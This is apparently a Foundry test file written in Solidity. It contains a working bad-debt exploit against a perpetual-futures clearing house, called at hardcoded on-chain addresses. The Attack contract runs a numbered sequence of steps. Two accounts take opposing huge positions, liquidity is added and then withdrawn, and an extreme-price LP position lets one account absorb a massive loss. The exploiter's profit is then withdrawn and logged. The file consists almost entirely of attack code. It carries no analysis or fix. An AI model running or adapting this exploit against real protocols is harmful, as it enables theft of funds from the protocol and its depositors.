// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {ERC20} from "solmate/tokens/ERC20.sol";
import "forge-std/Test.sol";
import "src/OptimismMinter.sol";

import { IClearingHouse } from "./IClearingHouse.sol";
import { IVault } from "./IVault.sol";
import { IMarketRegistry } from "./IMarketRegistry.sol";
import { IUniswapV3PoolState } from "./IUniswapV3.sol";
import { IAccountBalance } from "./IAccountBalance.sol";

contract Common {
    int24 internal constant MIN_TICK = -887272;
    /// @dev The maximum tick that may be passed to #getSqrtRatioAtTick computed from log base 1.0001 of 2**128
    int24 internal constant MAX_TICK = -MIN_TICK;

    function getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96) {
        uint256 absTick = tick < 0 ? uint256(-int256(tick)) : uint256(int256(tick));
        require(absTick <= uint256(int(MAX_TICK)), 'T');

        uint256 ratio = absTick & 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;
        if (absTick & 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) >> 128;
        if (absTick & 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) >> 128;
        if (absTick & 0x8 != 0) ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) >> 128;
        if (absTick & 0x10 != 0) ratio = (ratio * 0xffcb9843d60f6159c9db58835c926644) >> 128;
        if (absTick & 0x20 != 0) ratio = (ratio * 0xff973b41fa98c081472e6896dfb254c0) >> 128;
        if (absTick & 0x40 != 0) ratio = (ratio * 0xff2ea16466c96a3843ec78b326b52861) >> 128;
        if (absTick & 0x80 != 0) ratio = (ratio * 0xfe5dee046a99a2a811c461f1969c3053) >> 128;
        if (absTick & 0x100 != 0) ratio = (ratio * 0xfcbe86c7900a88aedcffc83b479aa3a4) >> 128;
        if (absTick & 0x200 != 0) ratio = (ratio * 0xf987a7253ac413176f2b074cf7815e54) >> 128;
        if (absTick & 0x400 != 0) ratio = (ratio * 0xf3392b0822b70005940c7a398e4b70f3) >> 128;
        if (absTick & 0x800 != 0) ratio = (ratio * 0xe7159475a2c29b7443b29c7fa6e889d9) >> 128;
        if (absTick & 0x1000 != 0) ratio = (ratio * 0xd097f3bdfd2022b8845ad8f792aa5825) >> 128;
        if (absTick & 0x2000 != 0) ratio = (ratio * 0xa9f746462d870fdf8a65dc1f90e061e5) >> 128;
        if (absTick & 0x4000 != 0) ratio = (ratio * 0x70d869a156d2a1b890bb3df62baf32f7) >> 128;
        if (absTick & 0x8000 != 0) ratio = (ratio * 0x31be135f97d08fd981231505542fcfa6) >> 128;
        if (absTick & 0x10000 != 0) ratio = (ratio * 0x9aa508b5b7a84e1c677de54f3e99bc9) >> 128;
        if (absTick & 0x20000 != 0) ratio = (ratio * 0x5d6af8dedb81196699c329225ee604) >> 128;
        if (absTick & 0x40000 != 0) ratio = (ratio * 0x2216e584f5fa1ea926041bedfe98) >> 128;
        if (absTick & 0x80000 != 0) ratio = (ratio * 0x48a170391f7dc42444e8fa2) >> 128;

        if (tick > 0) ratio = type(uint256).max / ratio;

        // this divides by 1<<32 rounding up to go from a Q128.128 to a Q128.96.
        // we then downcast because we know the result always fits within 160 bits due to our tick input constraint
        // we round up in the division so getTickAtSqrtRatio of the output price is always consistent
        sqrtPriceX96 = uint160((ratio >> 32) + (ratio % (1 << 32) == 0 ? 0 : 1));
    }

    IAccountBalance accountBalance = IAccountBalance(0xA7f3FC32043757039d5e13d790EE43edBcBa8b7c);
    address vEth = 0x8C835DFaA34e2AE61775e80EE29E2c724c6AE2BB;
    address vUsd = 0xC84Da6c8ec7A57cD10B939E79eaF9d2D17834E04;
    address vOne = 0x77d0cc9568605bFfF32F918C8FFaa53F72901416;

    IMarketRegistry registry = IMarketRegistry(0xd5820eE0F55205f6cdE8BB0647072143b3060067);

    IClearingHouse house = IClearingHouse(0x82ac2CE43e33683c58BE4cDc40975E73aA50f459);
    IVault vault = IVault(0xAD7b4C162707E0B2b5f6fdDbD3f8538A5fbA0d60);

    struct position {
        int24 lower;
        int24 upper;
        address baseToken;
        uint256 liquidity;
    }

    position[] positions;

    function removeLiquidity(address baseToken, uint256 index) public
    logStateChange(baseToken, "removeLiquidity") {
        position memory pos = positions[positions.length - 1];
        positions.pop();
        IClearingHouse.RemoveLiquidityParams memory params = IClearingHouse.RemoveLiquidityParams({
            baseToken: pos.baseToken,
            lowerTick: pos.lower,
            upperTick: pos.upper,
            liquidity: uint128(pos.liquidity),
            minBase: 0,
            minQuote: 0,
            deadline: block.timestamp
        });
        house.removeLiquidity(params);
    }

    function logPnl(address trader) public {
        console.log("Trader:", trader);
        (
            int256 owedRealizedPnl,
            int256 unrealizedPnl,
            uint256 pendingFee
        ) = accountBalance.getPnlAndPendingFee(trader);
        console.log("owedRealizedPnl:");
        console.logInt(owedRealizedPnl);
        console.log("unrealizedPnl:");
        console.logInt(unrealizedPnl);
    }

    modifier logStateChange(address baseToken, string memory action) {
        address pool = registry.getPool(baseToken);

        {
            (
                uint160 sqrtPriceX96,
                , // int24 tick,
                , // uint16 observationIndex,
                , // uint16 observationCardinality,
                ,// uint16 observationCardinalityNext,
                ,// uint8 feeProtocol,
                // bool unlocked
            ) = IUniswapV3PoolState(pool).slot0();
            console.log("pool slot0 sqrtPriceX96 before", sqrtPriceX96);
        }

        uint prevUsd = ERC20(vUsd).balanceOf(pool);
        uint prevBase = ERC20(baseToken).balanceOf(pool);
        _;
        uint currentUsd = ERC20(vUsd).balanceOf(pool);
        uint currentBase = ERC20(baseToken).balanceOf(pool);
        console.log("log state =====================================");
        console.logString(action);
        console.log("pool State before action ======================");
        console.log("Usd: ", prevUsd);
        console.log("base: ", prevBase);
        console.log("pool state after action ========================");
        console.log("Usd: ", currentUsd);
        console.log("base: ", currentBase);
        console.log("Net Pool");
        console.log("usd:");
        console.logInt(int(prevUsd) - int(currentUsd));
        console.log("base:");
        console.logInt(int(prevBase) - int(currentBase));

        {
            (
                uint160 sqrtPriceX96,
                , // int24 tick,
                , // uint16 observationIndex,
                , // uint16 observationCardinality,
                ,// uint16 observationCardinalityNext,
                ,// uint8 feeProtocol,
                // bool unlocked
            ) = IUniswapV3PoolState(pool).slot0();
            console.log("pool slot0 sqrtPriceX96 after ", sqrtPriceX96);
        }

        logPnl(address(this));
        console.log("end =============================================");
    }

    function addLiquiditiy(address baseToken, uint quoteAmount) public
        logStateChange(baseToken, "addLiquidity")
        returns(address pool)
     {
        pool = registry.getPool(baseToken);

        (
            , // uint160 sqrtPriceX96,
            int24 tick,
            , // uint16 observationIndex,
            , // uint16 observationCardinality,
            ,// uint16 observationCardinalityNext,
            ,// uint8 feeProtocol,
            // bool unlocked
        ) = IUniswapV3PoolState(pool).slot0();
        int24 space = IUniswapV3PoolState(pool).tickSpacing();
        int24 closestTick = tick%space;
        // console.logInt(int256(closestTick));
        IClearingHouse.AddLiquidityParams memory params = IClearingHouse.AddLiquidityParams({
            baseToken: baseToken,
            base: 1 ether,
            quote: quoteAmount,
            lowerTick: tick - closestTick - space - space,
            upperTick: tick - closestTick - space,
            minBase: 0,
            minQuote: 0,
            useTakerBalance: false,
            deadline: block.timestamp + 1
        });
        IClearingHouse.AddLiquidityResponse memory res = house.addLiquidity(params);


        positions.push(position({
            lower: tick - closestTick - space - space,
            upper: tick - closestTick - space,
            baseToken: baseToken,
            liquidity: res.liquidity
        }));
    }

    function buyShort(address baseToken, uint256 amount) public
        logStateChange(baseToken, "buyShort")
    returns(uint256 baseAmount, uint256 quoteAmount) {
        IClearingHouse.OpenPositionParams memory params =  IClearingHouse.OpenPositionParams({
            baseToken: baseToken,
            isBaseToQuote: false,
            isExactInput: true,
            amount: amount,
            oppositeAmountBound: 0,
            deadline: block.timestamp,
            sqrtPriceLimitX96: 0,
            referralCode: bytes32(0)
        });
        (baseAmount,  quoteAmount) =house.openPosition(params);
    }

    function buy(address baseToken, uint256 amount) public
        logStateChange(baseToken, "buy")
    returns(uint256 baseAmount, uint256 quoteAmount) {
        IClearingHouse.OpenPositionParams memory params =  IClearingHouse.OpenPositionParams({
            baseToken: baseToken,
            isBaseToQuote: true,
            isExactInput: false,
            amount: amount,
            oppositeAmountBound: 0,
            deadline: block.timestamp,
            sqrtPriceLimitX96: 0,
            referralCode: bytes32(0)
        });
        (baseAmount,  quoteAmount) =house.openPosition(params);
        // console.log("get quote:", quoteAmount);
        // console.log("get base:", baseAmount);
    }

    function sell(address base, uint256 amount) public
        logStateChange(base, "sell")
    returns(uint256 baseAmount, uint256 quoteAmount) {
        IClearingHouse.ClosePositionParams memory params =  IClearingHouse.ClosePositionParams({
            baseToken: base,
            // isBaseToQuote: false,
            // isExactInput: true,
            // amount: amount,
            oppositeAmountBound: 0,
            deadline: block.timestamp,
            sqrtPriceLimitX96: getSqrtRatioAtTick(MIN_TICK) + 100,
            referralCode: bytes32(0)
        });
        (baseAmount,  quoteAmount) =house.closePosition(params);
        // console.log("get quote:", quoteAmount);
        // console.log("get base:", baseAmount);
    }

    function sellMax(address base, uint256 amount) public
        logStateChange(base, "sell")
    returns(uint256 baseAmount, uint256 quoteAmount) {
        IClearingHouse.ClosePositionParams memory params =  IClearingHouse.ClosePositionParams({
            baseToken: base,
            // isBaseToQuote: false,
            // isExactInput: true,
            // amount: amount,
            oppositeAmountBound: 0,
            deadline: block.timestamp,
            sqrtPriceLimitX96: getSqrtRatioAtTick(MAX_TICK) - 100,
            referralCode: bytes32(0)
        });
        (baseAmount,  quoteAmount) =house.closePosition(params);
        // console.log("get quote:", quoteAmount);
        // console.log("get base:", baseAmount);
    }
}

contract BadDebt is Minter, Common {
    function deposit(uint256 amount) public {
        vm.deal(address(this), 10000 ether);
        // vault.depositEther{value: 200 ether}();
        ERC20(usdc).approve(address(vault), amount);
        vault.deposit(usdc, amount);
    }

    function badBuy(address baseToken, uint amount) public {
        buyShort(baseToken, amount);
    }

    function badSell(address baseToken, uint amount) public {
        logPnl(address(this));
        sell(baseToken, 0);

        address pool = registry.getPool(baseToken);
        (
             uint160 sqrtPriceX96 , // uint160 sqrtPriceX96,
             int24 tick,
            , // uint16 observationIndex,
            , // uint16 observationCardinality,
            ,// uint16 observationCardinalityNext,
            ,// uint8 feeProtocol,
            // bool unlocked
        ) = IUniswapV3PoolState(pool).slot0();
        console.log("pool state");
        console.log(uint(sqrtPriceX96));
        console.logInt(int(tick));
    }

    function unlimitLp(address baseToken, uint amount) public logStateChange(baseToken, "unlimited lp") {
        address pool = registry.getPool(baseToken);

        int24 space = IUniswapV3PoolState(pool).tickSpacing();
        int24 lower = -245760 + space * 999;

        // int24 upper = MAX_TICK - MAX_TICK%space;
        int24 upper = -245760 + space * 1000;
        // int24 lower  = upper - 20000 * space;
            IClearingHouse.AddLiquidityParams memory params = IClearingHouse.AddLiquidityParams({
            baseToken: baseToken,
            base: amount,
            quote: amount,
            lowerTick: lower,
            upperTick: upper,
            minBase: 0,
            minQuote: 0,
            useTakerBalance: false,
            deadline: block.timestamp + 1
        });
        IClearingHouse.AddLiquidityResponse memory res = house.addLiquidity(params);

        positions.push(position({
            lower: lower,
            upper: upper,
            baseToken: baseToken,
            liquidity: res.liquidity
        }));

    }
}

contract Attack is Test, Minter, Common {
    uint constant initialDaiAmount = 1_000_000e18;
    uint constant initialUsdtAmount = 1_000_000e6;
    uint constant initialUsdcAmount = 1_000_000e6;
    BadDebt bad;

    function setUp() public {
        mintDai(address(this), initialDaiAmount);
        mintUsdt(address(this), initialUsdtAmount);
        mintUsdc(address(this), initialUsdcAmount);
        bad = new BadDebt();
    }

    function testBadDebt() public {
        console.log("\n\n1. badDebtContract deposit collateral");
        mintUsdc(address(bad), initialUsdcAmount);
        bad.deposit(initialUsdcAmount);
        console.log("\n\n1. exploiter deposit collateral");
        ERC20(usdc).approve(address(vault), initialUsdcAmount);
        vault.deposit(usdc, initialUsdcAmount);

        uint256 hugeAmount = 9 * initialUsdcAmount * 10**12;

        console.log("\n\n2. exploiter add a huge concentrated liquidity (below the current price)");
        address pool = addLiquiditiy(vOne, hugeAmount);

        console.log("\n\n4. exploiter open a huge short position");
        buy(vOne, hugeAmount);

        console.log("\n\n3. badDebtContract open a huge long position");
        bad.badBuy(vOne, hugeAmount);

        console.log("\n\n5. exploiter remove the huge concentrated liquidity");
        removeLiquidity(vOne, 0);

        console.log("\n\n6. badDebtContract open a LP position at a really low price");
        bad.unlimitLp(vOne, 200000 ether);

        console.log("\n\n7. badDebtContract close position and realize a huge loss");
        bad.badSell(vOne, 0);

        console.log("\n\n8. exploiter close position and take the profit");
        sellMax(vOne, 0);

        vault.withdrawAll(usdc);
        uint256 currentUsdc = ERC20(usdc).balanceOf(address(this));
        console.log("currentUsdc:", currentUsdc);
        console.log("profit:", currentUsdc - initialUsdcAmount * 2);
    }
}
